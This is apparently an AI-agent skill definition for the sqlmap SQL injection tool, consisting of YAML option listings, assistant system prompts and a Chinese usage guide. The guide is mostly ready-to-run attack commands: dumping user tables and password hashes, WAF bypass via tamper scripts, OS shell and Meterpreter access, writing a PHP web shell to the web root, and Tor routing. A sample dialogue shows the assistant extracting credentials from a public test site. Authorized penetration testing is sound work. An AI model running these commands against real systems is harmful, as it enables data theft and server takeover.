---
name: sqlmap
nameEn: sqlmap SQL Injection
description: 开源SQL注入检测和利用工具，支持多种数据库、注入技术和数据提取
sources:
  product: sqlmap
  homepage: https://sqlmap.org
  api_doc: https://github.com/sqlmapproject/sqlmap/wiki
  github: https://github.com/sqlmapproject/sqlmap
  pricing: 开源免费
  api_type: CLI

metadata:
  openclaw:
    emoji: "💉"
    role: WEB
    combination: single
    version: "1.8"
    capabilities:
      light: ["SQL注入检测", "漏洞扫描", "安全评估"]
      dark: ["SQL注入利用", "数据库渗透", "数据窃取"]
      security: ["渗透测试", "漏洞验证", "Web安全"]
      legal: ["渗透测试授权"]
      technology: ["SQL注入", "数据库安全"]
      business: ["漏洞评估", "安全测试"]
    mitre_coverage:
      - "TA0001-Initial Access"
      - "TA0006-Credential Access"
      - "TA0007-Discovery"
    scf_coverage:
      - "RA-Risk Assessment"
apis:
  sqlmap_api:
    type: cli
    command: sqlmap
    options:
      - name: -u
        description: 目标URL
        required: true
      - name: --method
        description: HTTP方法 (GET/POST)
        default: "GET"
      - name: --data
        description: POST数据
        example: "id=1&user=admin"
      - name: --cookie
        description: HTTP Cookie头
        example: "PHPSESSID=abc123"
      - name: --batch
        description: 自动执行默认响应
        boolean: true
      - name: --level
        description: 检测级别 (1-5)
        default: "1"
        explanation: "1: always 5: exhaustive"
      - name: --risk
        description: 风险级别 (1-3)
        default: "1"
        explanation: "1:无害 3:可能导致数据损坏"
      - name: -p
        description: 指定测试参数
        example: "id,user"
      - name: --skip
        description: 跳过指定参数
        example: "session"
      - name: --dbms
        description: 指定数据库类型
        example: "MySQL,PostgreSQL,Oracle"
      - name: --os
        description: 指定操作系统
        example: "Linux,Windows"
      - name: --technique
        description: 注入技术 (B:E:U:S:T)
        default: "BEUST"
        explanation: "B:布尔, E:报错, U:联合, S:堆叠, T:时间"
      - name: --tamper
        description: 混淆脚本
        example: "between,randomcase,space2comment"
      - name: --dump
        description: 拖库 (获取数据)
        boolean: true
      - name: --dump-all
        description: 拖取所有数据
        boolean: true
      - name: -D
        description: 指定数据库
        example: "mysql"
      - name: -T
        description: 指定表
        example: "users"
      - name: -C
        description: 指定列
        example: "username,password"
      - name: --where
        description: WHERE条件
        example: "id>10"
      - name: --users
        description: 枚举数据库用户
        boolean: true
      - name: --passwords
        description: 枚举密码哈希
        boolean: true
      - name: --privileges
        description: 枚举用户权限
        boolean: true
      - name: --dbs
        description: 枚举数据库
        boolean: true
      - name: --tables
        description: 枚举表
        boolean: true
      - name: --columns
        description: 枚举列
        boolean: true
      - name: --schema
        description: 获取数据库架构
        boolean: true
      - name: --banner
        description: 获取数据库banner
        boolean: true
      - name: --current-db
        description: 获取当前数据库
        boolean: true
      - name: --current-user
        description: 获取当前用户
        boolean: true
      - name: --is-dba
        description: 判断是否为DBA
        boolean: true
      - name: --os-shell
        description: 获得OS shell
        boolean: true
      - name: --os-pwn
        description: 获得Meterpreter shell
        boolean: true
      - name: --random-agent
        description: 使用随机User-Agent
        boolean: true
      - name: --proxy
        description: 使用代理
        example: "http://127.0.0.1:8080"
      - name: --tor
        description: 使用Tor网络
        boolean: true
      - name: --batch
        description: 非交互模式
        boolean: true
      - name: -v
        description: 详细程度 (0-6)
        default: "1"
      - name: --output-dir
        description: 输出目录
        default: "/tmp/sqlmap"
      - name: --wizard
        description: 向导模式
        boolean: true
    output:
      console: "实时输出到终端"
      log: "详细日志文件"
      json: "JSON格式结果 (--output-dir)"
prompts:
  test:
    - role: system
      content: |
        你是一个专业的sqlmap渗透测试助手，擅长：
        1. 检测SQL注入漏洞
        2. 利用注入点获取数据
        3. 进行数据库渗透测试
        4. 提供修复建议
    - role: user
      content: |
        {{action}}：{{target}}
  analyze:
    - role: system
      content: |
        分析sqlmap结果时，请提供：
        1. 注入点确认
        2. 数据库类型和版本
        3. 发现的敏感数据
        4. 风险评估和修复建议
integration:
  install:
    command: |
      # pip (推荐)
      pip install sqlmap
      # macOS
      brew install sqlmap
      # Linux (Debian/Ubuntu)
      apt-get install sqlmap
      # Kali Linux
      # 已预装
      # GitHub最新版本
      git clone https://github.com/sqlmapproject/sqlmap.git
      cd sqlmap && python sqlmap.py --version
  config:
    - name: default_level
      label: 默认检测级别
      type: select
      options: ["1-基础", "2-中", "3-较高", "4-详细", "5-完整"]
      default: "1"
    - name: default_risk
      label: 默认风险级别
      type: select
      options: ["1-安全", "2-中等", "3-危险"]
      default: "1"
    - name: tamper_scripts
      label: 常用混淆脚本
      type: string
      default: "between,randomcase,space2comment"
  test:
    command: sqlmap --version
    expect: "sqlmap"
outputs:
  report:
    format: [text, json, html, sqlite]
    template: |
      # SQLMap 渗透测试报告
      ## 测试信息
      - 目标URL: {{url}}
      - 测试参数: {{parameter}}
      - 数据库类型: {{dbms}}
      ## 发现的注入点
      | 类型 | 参数 | 技术 |
      |------|------|------|
      {{injection_points}}
      ## 数据库信息
      - 当前用户: {{current_user}}
      - 当前数据库: {{current_db}}
      - 是否DBA: {{is_dba}}
      ## 枚举的数据
      {{enumerated_data}}
      ## 风险评估
      {{risk_assessment}}
      ## 修复建议
      {{remediation}}
---
# sqlmap 技能使用指南
## 功能概述
sqlmap是开源SQL注入检测和利用工具：
- **注入检测**: 自动检测SQL注入漏洞
- **数据提取**: 枚举和提取数据库数据
- **后渗透**: 获取OS shell、Meterpreter
- **数据库支持**: MySQL, PostgreSQL, Oracle, MSSQL等
- **混淆技术**: 多种绕过WAF的技术
## 快速开始
### 基本用法
```bash
# 检测注入
sqlmap -u "http://target.com/page.php?id=1"
# POST注入
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"
# Cookie注入
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```
### 完整渗透测试流程
```bash
# 1. 检测注入点和数据库
sqlmap -u "http://target.com/product.php?id=5" --batch
# 2. 获取数据库信息
sqlmap -u "http://target.com/product.php?id=5" --banner --current-db
# 3. 枚举数据库
sqlmap -u "http://target.com/product.php?id=5" --dbs
# 4. 选择数据库
sqlmap -u "http://target.com/product.php?id=5" -D targetdb --tables
# 5. 枚举表
sqlmap -u "http://target.com/product.php?id=5" -D targetdb -T users --columns
# 6. 拖取数据
sqlmap -u "http://target.com/product.php?id=5" -D targetdb -T users -C username,password --dump
```
## 注入技术
| 技术 | 选项 | 说明 | 适用场景 |
|------|------|------|----------|
| 布尔盲注 | B | 基于True/False响应 | 无回显 |
| 报错注入 | E | 基于错误消息 | 无回显但有报错 |
| 联合查询 | U | 使用UNION SELECT | 有回显 |
| 堆叠查询 | S | 执行多条SQL | 多语句执行 |
| 时间盲注 | T | 基于响应时间 | 无回显无声 |
```bash
# 指定技术
sqlmap -u "http://target.com/?id=1" --technique=U
# 使用所有技术
sqlmap -u "http://target.com/?id=1" --technique=BEUST
# 时间盲注 (针对MSSQL)
sqlmap -u "http://target.com/?id=1" --technique=T --time-sec=10
```
## 高级用法
### 绕过WAF
```bash
# 使用混淆脚本
sqlmap -u "http://target.com/?id=1" \
  --tamper=between,randomcase,space2comment
# 常用混淆脚本组合
--tamper=space2comment.py     # 空格替换为注释
--tamper=charencode.py        # URL编码
--tamper=between.py           # >替换为BETWEEN
--tamper=randomcase.py       # 大小写随机
```
### 数据库特定攻击
```bash
# MySQL
sqlmap -u "http://target.com/?id=1" --dbms=mysql
sqlmap -u "http://target.com/?id=1" --os-shell  # 需要DBA权限
# PostgreSQL
sqlmap -u "http://target.com/?id=1" --dbms=postgresql
sqlmap -u "http://target.com/?id=1" --os-shell
# MSSQL
sqlmap -u "http://target.com/?id=1" --dbms=mssql
sqlmap -u "http://target.com/?id=1" --xp-cmdshell  # 执行命令
# Oracle
sqlmap -u "http://target.com/?id=1" --dbms=oracle
sqlmap -u "http://target.com/?id=1" --sql-shell
```
### 深度渗透
```bash
# 获取OS shell
sqlmap -u "http://target.com/?id=1" --os-shell
# 上传文件
sqlmap -u "http://target.com/?id=1" --file-write=/tmp/shell.php \
  --file-dest=/var/www/html/shell.php
# 获取Meterpreter
sqlmap -u "http://target.com/?id=1" --os-pwn
# 注册表操作 (Windows)
sqlmap -u "http://target.com/?id=1" --reg-read \
  --reg-key="HKEY_LOCAL_MACHINE\\SOFTWARE\\MyKey"
```
## 实战示例
### 智能SQL注入测试对话
```
用户: 测试 http://testphp.vulnweb.com/list.php?cat=1
助手:
💉 **sqlmap SQL注入测试**
目标: http://testphp.vulnweb.com/list.php?cat=1
测试级别: 1 (基础)
风险级别: 1 (安全)
🔍 **第一阶段: 注入点检测**
[*] 测试参数: cat
[+] 检测到注入点!
  - 类型: UNION盲注
  - 技术: 基于错误
  - 数据库: MySQL >= 5.0
🔍 **第二阶段: 数据库枚举**
[*] 获取数据库版本
→ MySQL 5.7.30-0ubuntu0.16.04.1
[*] 枚举数据库
→ information_schema
→ acuart (当前数据库)
[*] 枚举表
→ acuart: artists, categ, featured, products, users
🔍 **第三阶段: 数据提取**
[*] 枚举users表列
→ uname, pass, email, address, phone, fax
[*] 拖取用户数据
| uname | pass | email |
|-------|------|-------|
| admin | admin123 | admin@test.com |
| user | user123 | user@test.com |
⚠️ **发现的高危问题**
1. 🔴 存在SQL注入漏洞
2. 🔴 用户密码明文存储 (MD5可逆)
3. 🔴 数据库用户权限过高
📊 **风险评估**
- CVSS评分: 9.8 (严重)
- 影响: 可完全控制数据库
- 可利用性: 高
📋 **修复建议**
1. 使用参数化查询
2. 实施输入验证
3. 密码哈希存储
4. 数据库账户权限最小化
```
## 输出管理
```bash
# 指定输出目录
sqlmap -u "http://target.com/?id=1" --output-dir=/tmp/sqlmap
# 查看日志
cat /tmp/sqlmap/log
# JSON格式输出
sqlmap -u "http://target.com/?id=1" --batch --dump --output-dir=/tmp/result
# SQLite存储结果
sqlmap -u "http://target.com/?id=1" --dump --sqlite-db=results.db
```
## 使用代理
```bash
# HTTP代理
sqlmap -u "http://target.com/?id=1" --proxy=http://127.0.0.1:8080
# SOCKS代理
sqlmap -u "http://target.com/?id=1" --proxy=socks5://127.0.0.1:1080
# Tor网络
sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5
```
## 注意事项
⚠️ **重要**:
- 仅用于授权的安全测试
- 执行前确保有渗透测试授权
- 高级选项可能破坏数据库
- 建议先在测试环境验证